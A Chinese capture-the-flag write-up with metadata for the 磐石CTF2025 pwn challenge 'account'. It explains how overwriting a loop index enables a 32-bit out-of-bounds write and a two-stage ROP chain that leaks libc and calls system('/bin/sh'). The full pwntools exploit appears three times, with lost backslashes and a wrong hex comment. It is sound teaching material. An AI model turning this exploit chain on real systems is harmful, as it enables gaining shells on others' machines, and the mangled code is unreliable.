---
title: 磐石CTF2025 Pwn赛题account详解：32位环境下的数组越界与ROP实战
contest: 磐石CTF2025
year: 2025
difficulty: easy
vuln_type: ret2libc
tags:
- 32位ROP
- 数组越界
- 栈溢出
- vuln()循环
- v1[v2++]覆盖返回地址
- ret2libc
- puts泄漏libc
attack_chain: vuln()读4字节入v0→v1[v2++]=v0循环10次填满v1→overwrite v1[10]=13改idx→v1[14]=ret_addr→ROP1:puts(puts@got)→libc_base→ROP2:system(/bin/sh)
key_payload: v1[v2++]=v0;v1[10]=v2 idx;v1[14]=ret_addr;main=0x8049264;pop_ebx_ret=0x08049022;puts@got泄libc_base=puts-0x6d1e0;system(/bin/sh)
one_liner: 磐石CTF2025 account：32位v1数组越界+循环10次+v2覆盖+两次ROP（泄libc+ret2libc）
lesson: 循环写入数组时v2 idx也可被覆盖，构造精确索引可写任意栈位置
quality: high
full_path: 磐石CTF2025_Pwn赛题account详解：32位环境下的数组越界与ROP实战.full.md
meta_path: 磐石CTF2025_Pwn赛题account详解：32位环境下的数组越界与ROP实战.meta.md
images_removed: true
images_removed_count: 2
schema_version: v3.0.0-P0
summary: 磐石CTF2025 Pwn赛题account详解：32位环境下的数组越界与ROP实战。磐石CTF2025 account：32位v1数组越界+循环10次+v2覆盖+两次ROP（泄libc+ret2libc）。经验：循环写入数组时v2 idx也可被覆盖，构造精确索引可写任意栈位置
category: pwn
subcategory: stack_overflow
time_required: quick
difficulty_score: 2
code_blocks_count: 1
images_count: 2
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/265318.html
reasoning_chain:
- 触发点：vuln()循环 read 4 字节→v1[v2++]=v0,10 次填满→假设：循环里 v2 索引本身可写
- 动作：v1[10] 实际就是 v2 变量位置→v2=13 后下次写 v1[14]=ret_addr→观察：栈布局确认 ret 在 v1[14]
- 假设：32 位无 PIE→直接拿固定 plt/got→动作：main=0x8049264 + pop_ebx_ret=0x08049022 + puts@plt + puts@got
- 观察：puts 泄出 puts@got 内容→libc_base=puts_addr-0x6d1e0→下一步：构造 system(/bin/sh) 第二段 ROP
- 动作：第二阶段同样写满 v1+改 idx=13+布局 system(/bin/sh)→观察：拿到 shell
- 假设：v2 自身覆盖是关键，循环 10 次后才有意义→下一步：payload 完全控制 v2=13 后再覆盖 ret
failed_attempts:
- 试图单次循环完成所有覆盖 → 失败：循环只有 10 次写 v0 机会
- 试图走 printf 泄栈 → 失败：vuln 里没 printf 只有固定 read
- 试图盲打 system 地址 → 失败：题目无 PIE 但 libc 未知
key_observations:
- v1[v2++] 循环写入时 v2 索引位置(v1[10])也可被覆盖，是经典栈外带越界
- 32 位无 PIE 程序靠 plt/got + 两段 ROP(泄 libc→ret2libc)是标准模板
- v2=13 之后继续循环可精确写到 ret_addr(v1[14])
- puts@got + pop_ebx_ret 配合 32 位 cdecl 是 ROP 泄 libc 最简组合
prerequisites:
- 32 位栈帧布局(old rbp 在 v1[12]、ret_addr 在 v1[14])
- ROP gadget 查找(pwntools ROP 类)
- libc 数据库(查询 puts→libc_base 偏移)
- pwntools 基本用法(remote/recvuntil/ljust)
---
# 磐石CTF2025 Pwn赛题account详解：32位环境下的数组越界与ROP实战

> 原文: https://www.ctfiot.com/265318.html
> ID: 265318

account

前言

关注公众号【Real返璞归真】，回复【磐石CTF2025】获取附件下载地址。

题目名：account

解题数：121

题目描述：无

知识点：数组越界访问、栈溢出、32位ROP

逆向分析

题目逻辑非常简单，只有一个vuln()函数：
image-20250807191623752

我们输入的数据被存储到v0变量中，这里把v0[0]也识别成后续数组的一部分了，我们对其修复，把v0类型改成非数组即可：
image-20250807191735782

漏洞分析

vuln()函数会循环读取我们的4字节输入，然后修改v1[v2++] = v0，从v1[0]逐渐向栈中高地址处增长，这里存在栈溢出漏洞。

如果增长的次数足够多，我们可以覆盖old_rbp、ret_addr等数据。思路非常简单，我们直接向返回地址处写入ROP即可。

需要注意一点：修改v1[10]即修改变量v2，它是数组当前循环的下标，我们需要写入一个合法的值，否则会出错。

先将v1数组写满，然后修改v2变量为13（下次循环会修改v1[14]位置，即存储返回地址的位置）：

for i in range(10):
    p.sendline(b'57005') # 0x1234
    sleep(0.2)

# overwrite idx->13
p.sendline(b'13')
sleep(0.2)

然后，写入第一次rop泄露libc地址：

# rop1
main = 0x8049264
pop_ebx_ret = 0x08049022

# gdb.attach(p, 'b *0x80492C8nc')
# pause()

p.sendline(str(elf.plt['puts']).encode())
sleep(0.2)
p.sendline(str(pop_ebx_ret).encode())
sleep(0.2)
p.sendline(str(elf.got['puts']).encode())
sleep(0.2)
p.sendline(str(main).encode())
sleep(0.2)

p.sendline(b'0')

p.recvuntil(b'Recording completedn')
libc_base = u32(p.recvuntil(b'xf7')[-4:].ljust(4, b'x00')) - 0x6d1e0
libc.address = libc_base
success("libc_base = " + hex(libc_base))

然后，写入第二次rop直接ret2libc即可：

# rop2
for i in range(10):
    p.sendline(b'57005') # 0x1234
    sleep(0.2)

# overwrite idx->13
p.sendline(b'13')
sleep(0.2)

# gdb.attach(p, 'b *0x80492C8nc')
# pause()

def to_signed(val):
    return val if val < 0x80000000else val - 0x100000000

p.sendline(str(to_signed(libc.sym['system'])).encode())
sleep(0.2)
p.sendline(str(pop_ebx_ret).encode())
sleep(0.2)
p.sendline(str(to_signed(next(libc.search(b'/bin/shx00')))).encode())
sleep(0.2)

p.sendline(b'0')

这里需要注意，32位程序中的地址均为4字节无符号整数，而程序使用scanf("%d", &v0)读入的是4字节有符号整数。

如果ROP中想写入的地址非常大，%d将无法读取，我们需要先将这个大数字转换为对应的负数，然后输入到程序中。

exp

from pwn import *

elf = ELF("./account")
libc = ELF("./libc-2.31.so")
# p = process([elf.path])
p = remote("pss.idss-cn.com", 22117)

context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'

for i in range(10):
    p.sendline(b'57005') # 0x1234
    sleep(0.2)

# overwrite idx->13
p.sendline(b'13')
sleep(0.2)

# rop1
main = 0x8049264
pop_ebx_ret = 0x08049022

# gdb.attach(p, 'b *0x80492C8nc')
# pause()

p.sendline(str(elf.plt['puts']).encode())
sleep(0.2)
p.sendline(str(pop_ebx_ret).encode())
sleep(0.2)
p.sendline(str(elf.got['puts']).encode())
sleep(0.2)
p.sendline(str(main).encode())
sleep(0.2)

p.sendline(b'0')

p.recvuntil(b'Recording completedn')
libc_base = u32(p.recvuntil(b'xf7')[-4:].ljust(4, b'x00')) - 0x6d1e0
libc.address = libc_base
success("libc_base = " + hex(libc_base))

# rop2
for i in range(10):
    p.sendline(b'57005') # 0x1234
    sleep(0.2)

# overwrite idx->13
p.sendline(b'13')
sleep(0.2)

# gdb.attach(p, 'b *0x80492C8nc')
# pause()

def to_signed(val):
    return val if val < 0x80000000else val - 0x100000000

p.sendline(str(to_signed(libc.sym['system'])).encode())
sleep(0.2)
p.sendline(str(pop_ebx_ret).encode())
sleep(0.2)
p.sendline(str(to_signed(next(libc.search(b'/bin/shx00')))).encode())
sleep(0.2)

p.sendline(b'0')

p.interactive()


```
for i in range(10):
    p.sendline(b'57005') # 0x1234
    sleep(0.2)

# overwrite idx->13
p.sendline(b'13')
sleep(0.2)
# rop1
main = 0x8049264
pop_ebx_ret = 0x08049022

# gdb.attach(p, 'b *0x80492C8nc')
# pause()

p.sendline(str(elf.plt['puts']).encode())
sleep(0.2)
p.sendline(str(pop_ebx_ret).encode())
sleep(0.2)
p.sendline(str(elf.got['puts']).encode())
sleep(0.2)
p.sendline(str(main).encode())
sleep(0.2)

p.sendline(b'0')

p.recvuntil(b'Recording completedn')
libc_base = u32(p.recvuntil(b'xf7')[-4:].ljust(4, b'x00')) - 0x6d1e0
libc.address = libc_base
success("libc_base = " + hex(libc_base))
# rop2
for i in range(10):
    p.sendline(b'57005') # 0x1234
    sleep(0.2)

# overwrite idx->13
p.sendline(b'13')
sleep(0.2)

# gdb.attach(p, 'b *0x80492C8nc')
# pause()

def to_signed(val):
    return val if val < 0x80000000else val - 0x100000000

p.sendline(str(to_signed(libc.sym['system'])).encode())
sleep(0.2)
p.sendline(str(pop_ebx_ret).encode())
sleep(0.2)
p.sendline(str(to_signed(next(libc.search(b'/bin/shx00')))).encode())
sleep(0.2)

p.sendline(b'0')
from pwn import *

elf = ELF("./account")
libc = ELF("./libc-2.31.so")
# p = process([elf.path])
p = remote("pss.idss-cn.com", 22117)

context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'

for i in range(10):
    p.sendline(b'57005') # 0x1234
    sleep(0.2)

# overwrite idx->13
p.sendline(b'13')
sleep(0.2)

# rop1
main = 0x8049264
pop_ebx_ret = 0x08049022

# gdb.attach(p, 'b *0x80492C8nc')
# pause()

p.sendline(str(elf.plt['puts']).encode())
sleep(0.2)
p.sendline(str(pop_ebx_ret).encode())
sleep(0.2)
p.sendline(str(elf.got['puts']).encode())
sleep(0.2)
p.sendline(str(main).encode())
sleep(0.2)

p.sendline(b'0')

p.recvuntil(b'Recording completedn')
libc_base = u32(p.recvuntil(b'xf7')[-4:].ljust(4, b'x00')) - 0x6d1e0
libc.address = libc_base
success("libc_base = " + hex(libc_base))

# rop2
for i in range(10):
    p.sendline(b'57005') # 0x1234
    sleep(0.2)

# overwrite idx->13
p.sendline(b'13')
sleep(0.2)

# gdb.attach(p, 'b *0x80492C8nc')
# pause()

def to_signed(val):
    return val if val < 0x80000000else val - 0x100000000

p.sendline(str(to_signed(libc.sym['system'])).encode())
sleep(0.2)
p.sendline(str(pop_ebx_ret).encode())
sleep(0.2)
p.sendline(str(to_signed(next(libc.search(b'/bin/shx00')))).encode())
sleep(0.2)

p.sendline(b'0')

p.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]